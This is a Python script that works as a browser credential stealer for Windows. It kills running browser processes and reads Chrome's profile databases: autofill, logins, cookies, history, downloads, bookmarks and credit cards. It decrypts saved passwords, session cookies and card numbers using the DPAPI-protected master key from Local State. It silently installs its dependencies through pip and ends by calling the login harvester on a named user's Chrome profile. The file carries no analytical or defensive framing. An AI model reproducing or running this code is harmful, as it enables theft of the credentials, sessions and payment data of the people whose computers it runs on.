import sqlite3
import os
import pip
import json
import base64

try:
    import psutil
except:
    pip.main(['install', 'psutil'])
try:
    import win32crypt
except:
    pip.main(['install', 'pypiwin32'])
    pip.main(['install', 'pywin32'])
    import win32crypt

try:
    from Crypto.Cipher import AES
except:
    pip.main(['install', 'pycryptodome'])
    from Crypto.Cipher import AES


def getAutoFill(browser, browser_path):
    print("Browser path: ", browser_path)
    try:
        # Check if any profile exists. Such as chrome has "Profile 1", "Profile 2", etc.
        if os.path.exists(browser_path + "Default\\Web Data"):
            # Check if the process is running, then close it.
            # This is needed to access the database.
            for proc in psutil.process_iter():
                if proc.name().lower() == browser.lower() + ".exe":
                    proc.kill()  # or proc.kill() if process needs a gentle kill

            # Connect to the database
            conn = sqlite3.connect(browser_path + "Default\\Web Data")
            # Create a cursor
            cursor = conn.cursor()

            # cursor.execute(f"PRAGMA table_info({'autofill'})")
            # Make the pragma actually work: pragma table_info(cookies)
            # columns = [column[1] for column in cursor.fetchall()]
            columns = ["name", "value", "date_last_used"]
            # Execute a query
            cursor.execute("SELECT name, value, date_last_used FROM autofill")
            # Fetch the results
            results = cursor.fetchall()
            # Close the connection
            conn.close()
            # Return the results
            return {"columns": columns, "results": results}
    except:
        return None


def getLoginData(browser, browser_path):
    print("Browser path: ", browser_path)
    try:
        print(os.path.exists(browser_path + "Default\\Login Data"))
        # Check if any profile exists. Such as chrome has "Profile 1", "Profile 2", etc.
        if os.path.exists(browser_path + "Default\\Login Data"):
            print("Login Data exists")
            # Check if the process is running, then close it.
            # This is needed to access the database.
            for proc in psutil.process_iter():
                if proc.name().lower() == browser.lower() + ".exe":
                    proc.kill()  # or proc.kill() if process needs a gentle kill

            # Connect to the database
            conn = sqlite3.connect(browser_path + "Default\\Login Data")
            # Create a cursor
            cursor = conn.cursor()

            # cursor.execute(f"PRAGMA table_info({'logins'})")
            # columns = [column[1] for column in cursor.fetchall()]
            columns = ["origin_url", "password_value", "username_value",
                       "sender_email", "sender_name", "sender_email"]
            # Execute a query
            cursor.execute(
                "SELECT origin_url, password_value, username_value, sender_email, sender_name, sender_email FROM logins")
            # Fetch the results
            results = cursor.fetchall()

            # Loop through the results, then replace the fourth key with a decrypted version of the password
            for i, row in enumerate(results):
                try:
                    password = decrypt_password(
                        row[1], get_master_key(browser_path))
                    # Edit the tuple to replace the password with the decrypted version
                    results[i] = list(row)

                    results[i][1] = password

                    # Turn it back into a tuple
                    results[i] = tuple(results[i])

                except Exception as e:
                    print(e)
                    pass

            # Close the connection
            conn.close()
            # Return the results
            return {"columns": columns, "results": results}
    except:
        return None


def getCookies(browser, browser_path):
    try:
        # Check if any profile exists. Such as chrome has "Profile 1", "Profile 2", etc.
        cookies_path = os.path.join(browser_path, "Default\\Network/Cookies")

        if os.path.exists(cookies_path):
            # Check if the browser process is running, then close it.
            for proc in psutil.process_iter(attrs=['pid', 'name']):
                if proc.info['name'].lower() == f"{browser}.exe":
                    try:
                        proc.kill()  # Kill the process
                    except psutil.NoSuchProcess:
                        pass  # Handle if the process no longer exists

            # Connect to the database
            conn = sqlite3.connect(cookies_path)
            # Create a cursor
            cursor = conn.cursor()

            columns = ["host_key", "name", "value", "encrypted_value"]

            # Execute a query
            cursor.execute("SELECT * FROM cookies")
            # Decrypt the cookies using win32crypt
            cookies = []
            if browser == "chrome":
                data = cursor.fetchall()
                for row in data:
                    try:
                        host_key = row[1]
                        name = row[3]
                        value = row[4]
                        encrypted_value = row[5]
                        try:
                            decrypted_value = decrypt_password(
                                encrypted_value, get_master_key(browser_path))
                        except:
                            decrypted_value = encrypted_value
                        cookies.append((host_key, name, decrypted_value))
                    except Exception as e:
                        print(e)
                        pass
            else:
                for row in cursor.fetchall():
                    cookies.append(row)

            conn.close()

            # Return the results
            return {"columns": columns, "results": cookies}
    except Exception as e:
        print(f"Error: {str(e)}")
        return None


def getHistory(browser, browser_path):
    print("Browser path: ", browser_path + "Default\\History")
    try:
        # Check if any profile exists. Such as chrome has "Profile 1", "Profile 2", etc.
        if os.path.exists(browser_path + "Default\\History"):
            # Check if the process is running, then close it.
            # This is needed to access the database.
            for proc in psutil.process_iter():
                if proc.name().lower() == browser.lower() + ".exe":
                    proc.kill()  # or proc.kill() if process needs a gentle kill

            # Connect to the database
            conn = sqlite3.connect(browser_path + "Default\\History")
            # Create a cursor
            cursor = conn.cursor()

            # cursor.execute(f"PRAGMA table_info({'urls'})")
            # columns = [column[1] for column in cursor.fetchall()]
            columns = ["url", "title", "visit_count", "last_visit_time"]
            # Execute a query
            cursor.execute(
                "SELECT url, title, visit_count, last_visit_time FROM urls")
            # Fetch the results
            results = cursor.fetchall()
            # Close the connection
            conn.close()
            # Return the results
            return {"columns": columns, "results": results}
        else:
            print("History file not found")
    except:
        return None


def getDownloads(browser, browser_path):
    print("Browser path: ", browser_path)
    try:
        # Check if any profile exists. Such as chrome has "Profile 1", "Profile 2", etc.
        if os.path.exists(browser_path + "Default\\History"):
            # Check if the process is running, then close it.
            # This is needed to access the database.
            for proc in psutil.process_iter():
                if proc.name().lower() == browser.lower() + ".exe":
                    proc.kill()  # or proc.kill() if process needs a gentle kill

            # Connect to the database
            conn = sqlite3.connect(browser_path + "Default\\History")
            # Create a cursor
            cursor = conn.cursor()

            # cursor.execute(f"PRAGMA table_info({'downloads'})")
            # columns = [column[1] for column in cursor.fetchall()]
            columns = ["tab_url", "current_path", "last_modified"]
            # Execute a query
            cursor.execute(
                "SELECT tab_url, current_path, last_modified FROM downloads")
            # Fetch the results
            results = cursor.fetchall()
            # Close the connection
            conn.close()
            # Return the results
            return {"columns": columns, "results": results}
    except:
        return None


def getBookmarks(browser, browser_path):
    print("Browser path: ", browser_path)
    try:
        # Check if any profile exists. Such as chrome has "Profile 1", "Profile 2", etc.
        if os.path.exists(browser_path + "Default\\Bookmarks"):
            # Check if the process is running, then close it.
            # This is needed to access the database.
            for proc in psutil.process_iter():
                if proc.name().lower() == browser.lower() + ".exe":
                    proc.kill()  # or proc.kill() if process needs a gentle kill

            # Connect to the database
            conn = sqlite3.connect(browser_path + "Default\\Bookmarks")
            # Create a cursor
            cursor = conn.cursor()

            cursor.execute(f"PRAGMA table_info({'bookmarks'})")
            columns = [column[1] for column in cursor.fetchall()]
            # Execute a query
            cursor.execute("SELECT * FROM bookmarks")
            # Fetch the results
            results = cursor.fetchall()
            # Close the connection
            conn.close()
            # Return the results
            return {"columns": columns, "results": results}
    except:
        return None


def getCreditCards(browser, browser_path):
    print("Browser path: ", browser_path)
    try:
        # Check if any profile exists. Such as chrome has "Profile 1", "Profile 2", etc.
        if os.path.exists(browser_path + "Default\\Web Data"):
            # Check if the process is running, then close it.
            # This is needed to access the database.
            for proc in psutil.process_iter():
                if proc.name().lower() == browser.lower() + ".exe":
                    proc.kill()  # or proc.kill() if process needs a gentle kill

            # Connect to the database
            conn = sqlite3.connect(browser_path + "Default\\Web Data")
            # Create a cursor
            cursor = conn.cursor()

            cursor.execute(f"PRAGMA table_info({'credit_cards'})")
            columns = [column[1] for column in cursor.fetchall()]
            # Execute a query
            cursor.execute("SELECT * FROM credit_cards")
            # Fetch the results
            results = cursor.fetchall()
            # Close the connection

            # Loop around the results and decrypt the credit card numbers
            for i, row in enumerate(results):
                try:
                    card_number = decrypt_password(
                        row[4], get_master_key(browser_path))
                    results[i] = list(row)
                    results[i][4] = card_number
                except Exception as e:
                    print(e)
                    pass
            conn.close()
            # Return the results
            return {"columns": columns, "results": results}
    except:
        return None


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(
        master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


getLoginData(
    "chrome", "C:\\Users\\lukma\\AppData\\Local\\Google\\Chrome\\User Data\\")
